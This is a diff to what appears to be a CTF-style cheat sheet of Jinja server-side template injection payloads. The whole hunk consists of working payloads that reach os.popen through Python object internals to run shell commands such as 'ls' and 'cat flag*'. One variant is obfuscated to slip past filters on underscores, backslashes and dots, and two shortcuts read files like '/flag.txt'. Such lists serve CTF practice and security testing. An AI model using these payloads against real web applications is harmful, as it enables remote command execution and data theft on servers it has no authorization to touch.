@@ -7,13 +7,13 @@
 #### Jinja payload <i>(Python)</i> : 
 
 ```py
- #normal payload
+#normal payload
  {{ ''.__class__.__base__.__subclasses__()[103].__init__.__globals__['sys'].modules['os'].popen("ls").read() }}
 
- #payload without '_' and without '\' 
-{% set c='%c%c'|format(95,95) %}  {{ dict.mro()[-1] | attr(c~'subclasses'~c)() | attr(c~'getitem'~c)(183) |attr(c~'init'~c) | attr(c~'globals'~c) | attr(c~'getitem'~c)('sys') | attr('modules') | attr(c~'getitem'~c)('os') | attr('popen')('cat flag*') | attr('read')() }}
+#payload without '_' and without '\' ad without '.'
+{%set c='%c%c'|format(95,95)%}{{dict|attr('mro')()|attr(c~'getitem'~c)(1)|attr(c~'subclasses'~c)()|attr(c~'getitem'~c)(221)|attr(c~'init'~c)|attr(c~'globals'~c)|attr(c~'getitem'~c)('sys')|attr('modules')|attr(c~'getitem'~c)('os')|attr('popen')('ls')|attr('read')()}}
 
- #shortcuts
+#shortcuts
  {{ url_for.__globals__.os.popen("ls").read() }}
  {{ self.__init__.__globals__.__builtins__.open("/flag.txt").read() }}
  ```
